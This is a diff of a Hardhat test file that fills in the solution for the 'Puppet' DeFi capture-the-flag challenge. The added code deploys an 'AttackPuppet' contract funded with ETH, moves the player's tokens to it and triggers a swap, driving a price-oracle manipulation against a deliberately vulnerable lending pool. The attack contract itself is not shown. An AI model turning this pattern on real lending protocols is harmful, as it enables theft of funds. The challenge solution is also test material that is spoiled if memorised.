@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { BigNumber } = require("ethers");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -93,9 +94,32 @@ describe('[Challenge] Puppet', function () {
         ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
     });
 
-    it('Execution', async function () {
+    it("Execution", async function () {
         /** CODE YOUR SOLUTION HERE */
-    });
+        const Attacker = await ethers.getContractFactory("AttackPuppet");
+        const attacker = await Attacker.deploy(
+          uniswapExchange.address,
+          lendingPool.address,
+          token.address,
+          player.address,
+          { value: ethers.utils.parseEther("15") }
+        );
+        console.log("Attacker @", attacker.address);
+        let bal = await attacker.provider.getBalance(attacker.address);
+        console.log(
+          "Attacker ETH balance before",
+          ethers.utils.formatEther(bal.toString())
+        );
+        await token
+          .connect(player)
+          .transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        bal = await token.balanceOf(attacker.address);
+        console.log(
+          `Attacker token balance before `,
+          ethers.utils.formatEther(bal.toString())
+        );
+        await attacker.swap();
+      });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
